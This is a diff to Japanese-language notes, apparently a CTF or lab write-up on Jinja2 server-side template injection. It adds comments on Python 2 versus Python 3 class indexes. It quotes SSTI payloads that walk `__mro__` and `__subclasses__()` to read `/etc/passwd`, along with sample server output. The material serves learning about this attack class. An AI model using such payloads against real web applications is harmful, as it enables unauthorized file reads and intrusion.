@@ -511,6 +511,9 @@ True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIM
 Hello <class 'str'>! 
 ```
 - `{{''.__class__.__mro__}}`   
+以下の出力の場合、Python3で実行されていることがわかる。  
+`''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()`みたいなのの`2`はPython2用のindexなのでPython3の場合は`1`に修正する。  
+python2なら`(<type 'str'>, <type 'basestring'>, <type 'object'>)`が返る。  
 ```txt
 Hello (<class 'str'>, <class 'object'>)! 
 ```
@@ -530,6 +533,7 @@ Hello <class 'object'>!
 - `{{''.__class__.__mro__[1].__subclasses__()}}`   
 この中に`<class 'file'>`がない…   
 なので、`''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()`みたいにできない？？   
+このPayloadはpython2専用。Python3だとindex 40のクラスは`<class 'wrapper_descriptor'>`で、`read`メソッドが存在しないので使えない。  
 ```txt
 Hello [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 
 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, 
